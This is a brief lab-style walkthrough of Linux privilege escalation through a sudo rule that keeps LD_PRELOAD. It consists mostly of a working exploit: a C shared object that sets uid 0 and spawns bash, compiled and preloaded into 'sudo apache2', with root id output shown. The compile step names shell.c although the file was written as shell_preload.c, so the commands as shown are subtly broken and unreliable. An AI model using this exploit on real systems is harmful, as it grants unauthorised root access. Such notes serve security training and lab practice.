# Living off the Land

## 01 - Enumerate

```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD
..[omitted]..
```

## 02 - Exploit

```
user@debian:~$ mkdir exploit && cd exploit
user@debian:~/exploit$ cat > shell_preload.c << EOF
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
user@debian:~/exploit$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
user@debian:~/exploit$ sudo LD_PRELOAD=~/exploit/shell.so apache2
root@debian:/home/user/exploit# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user/exploit# exit
exit
apache2: bad user name ${APACHE_RUN_USER}
user@debian:~/exploit$
```

## 03 - Cleanup

```
user@debian:~/exploit$ cd ..
user@debian:~$ rm -rf exploit/
```

---
## References

### Hacktricks

- [Hacktricks: Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)